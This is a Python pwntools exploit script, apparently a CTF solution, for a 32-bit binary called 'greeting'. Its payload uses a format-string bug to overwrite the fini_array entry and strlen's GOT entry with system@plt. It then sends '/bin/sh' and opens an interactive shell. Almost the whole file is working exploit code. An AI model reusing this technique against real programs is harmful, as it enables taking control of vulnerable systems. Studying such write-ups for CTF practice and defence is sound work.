#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./greeting
from pwn import *

context.terminal = ["tmux", "splitw", "-h"]

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './greeting')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
set follow-fork-mode parent
start
bp 0x0804864f
bp 0x08048679
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    No RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

io = start()

# dest
fini_array = exe.symbols['__do_global_dtors_aux_fini_array_entry']      # 0x08049934
got_strlen = exe.got['strlen']                                          # 0x08049a54
# source
## getnline = exe.symbols['getnline']                                    # 0x08048679
## non crash getnline from main:
getnline = 0x08048614
plt_system = exe.plt['system']                                          # 0x08048490

payload = flat(
    b"a"*2,                         # alignment
    p32(fini_array),                # %12$hn
    p32(fini_array + 2),            # %13$hn
    p32(got_strlen),                # %14$hn
    p32(got_strlen + 2),            # %15$hn
    # base 0x0024
    b"%%%dd%%13$hn" % (0x0804-0x0024),                                          # ghi 0x0804 vào fini_array+2
    b"%15$hn",                                                                  # ghi 0x0804 vào got_strlen+2
    b"%%%dd%%14$hn" % ((plt_system & 0xffff) - 0x0804),                         # ghi 2 bytes cuối plt_system vào got_strlen
    b"%%%dd%%12$hn" % ((getnline & 0xffff) - (plt_system & 0xffff))             # ghi 2 bytes cuối getnline vào fini_array
)

io.sendlineafter(b"Please tell me your name...", payload)
io.sendline(b"/bin/sh")

io.interactive()

